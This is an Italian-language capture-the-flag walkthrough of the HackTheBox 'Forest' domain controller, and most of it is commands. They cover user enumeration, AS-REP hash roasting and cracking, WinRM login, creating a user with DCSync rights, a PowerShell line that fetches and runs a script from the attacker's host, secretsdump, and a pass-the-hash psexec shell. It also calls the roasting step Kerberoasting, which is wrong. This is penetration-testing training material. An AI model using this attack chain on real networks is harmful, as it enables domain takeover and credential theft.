# Forest

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```bash
sudo nmapAutomator.sh --host 10.10.10.161 --type All
```

Il risultato della scansione è il seguente:

```bash
Running all scans on 10.10.10.161

Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl


---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-10 15:38:06Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-01-10T07:38:11-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2024-01-10T15:38:12
|_  start_date: 2024-01-10T11:54:46
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h46m48s, deviation: 4h37m09s, median: 6m47s



---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49682/tcp open  unknown
49704/tcp open  unknown
49706/tcp open  unknown

Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49671, 49676, 49677, 49682, 49704, 49706


PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49671/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49682/tcp open  msrpc      Microsoft Windows RPC
49704/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


----------------------Starting UDP Scan------------------------

PORT    STATE SERVICE      VERSION
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-10 15:45:11Z)
123/udp open  ntp          NTP v3
389/udp open  ldap?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

Dal risultato della scansione sembra di avere davanti un _Domain Controller_.

## Enumeration
Provando ad enumerare il DNS, non ottengo nulla.

Risultano inutili anche i successivi tentativi di enumerazione con _smbmap_ e _smbclient_.

Provo quindi utilizzando _enum4linux_ e ricavo delle informazioni utili nella sezione _Users_ dell'output:

```bash
enum4linux -a 10.10.10.161
```

```bash
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[huser] rid:[0x2581]
```

Quindi, creo un file _user.txt_ contenente la lista di utenti appena trovati e provo ad utilizzare la tecnica del _Kerberoasting_ attraverso l'impiego di [Impacket](https://github.com/fortra/impacket).

In particolare utilizzo il codice _GetUserSPNs.py_ (nella directory _exemples_) sulla lista di utenti precedentemente creata:

```bash
for user in $(cat ../users.txt); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

Ottengo così la seguente chiave per l'utente _svc_alfresco_:

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-1.png"/>
</p>

Quindi salvo questo TGS nel file _spn-svc_alfresco.txt_ e provo a ricavare la password tramite _johntheripper_:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt spn-svc_alfresco.txt
```

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-2.png"/>
</p>

## Exploitation
Per loggarmi come admin utilizzo lo script _WinRM_:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-3.png"/>
</p>

**Ottengo cosi il primo flag!**

## Privilege Escalation

Ora utilizzo [BloodHound](https://www.stationx.net/how-to-use-bloodhound-active-directory/) per avere un quadro completo del dominio.

Per prima cosa carico il file _SharpHound.exe_ sulla macchina vittima tramite il seguente comando (sempre attraverso _WinRM_):

```bash
upload /home/kali/HTB/windows/toolkit/SharpHound.exe C:\Users\svc-alfresco\Documents\SharpHound.exe
```

Successivamente, lo eseguo generando un file zip che trasferisco sulla mia macchina per poi caricarlo su _BloodHound_:

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-4.png"/>
</p>

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-6.png"/>
</p>

Da qui posso notare tra me e il mio obiettivo, ovvero l'amministratore, ci sono soltanto due passi da fare.

Inoltre l'utente fa parte di 9 gruppi e uno di questi è l'ACCOUNT OPERATORS, un gruppo con privilegi AD. I membri di questo hanno il permesso di creare e modificare utenti e di aggiungere questi a gruppi di tipo non-protected.


<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-7.png"/>
</p>

Uno dei path mostra che il gruppo _Exchange Windows Permissions_ ha privilegi di tipo _WriteDacl_ che permettono agli utenti di aggiungere ACL ad un oggetto. Questo vuol dire che (come utente _svc_alfresco_) posso aggiungere un utente a questo gruppo fornendogli privilegi _DCSync_.

Ritorno quindi sulla shell _WinRM_ e aggiungo un nuovo utente ai gruppi _Exchange Windows Permissions_ e _Remote Management Users_:

```bash
net user naclapor topolino123! /add /domain
```

```bash
net group "Exchange Windows Permissions" naclapor /add
```

```bash
net localgroup "Remote Management Users" naclapor /add
```

Procedo scaricando sulla macchina vittima il file [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1):

```bash
iex(new-object net.webclient).downloadstring('http://10.10.14.8:8888/PowerView.ps1')
```

Successivamente, utilizzo Add-ObjectACL con le credenziali dell'utente appena creato fornendogli i privilegi DCSync:

```bash
$password = convertto-securestring 'topolino123!' -asplain -force
```

```bash
$cred = new-object system.management.automation.pscredential('htb\naclapor', $password)
```
```bash
Add-ObjectACL -PrincipalIdentity naclapor -Credential $cred -Rights DCSync
```

Ora utilizzo lo script _secretsdump.py_ di [_Impacket_](https://github.com/fortra/impacket) per ottenere l'NTLM:

```bash
python secretsdump.py htb/naclapor@10.10.10.161
```

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-8.png"/>
</p>

Una volta ottenuto l'hash utilizzo lo script _psexec.py_ per ottenre una shell con privilegi administator:

```bash
python psexec.py administator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

<p align="center">
  <img src="/Immagini/Windows-Box/Forest/forest-9.png"/>
</p>

**Ottengo così il secondo flag!**

## Credits

 - [Sanaullah Aman Korai](https://sanaullahamankorai.medium.com/hackthebox-forest-walkthrough-2843a6386032)
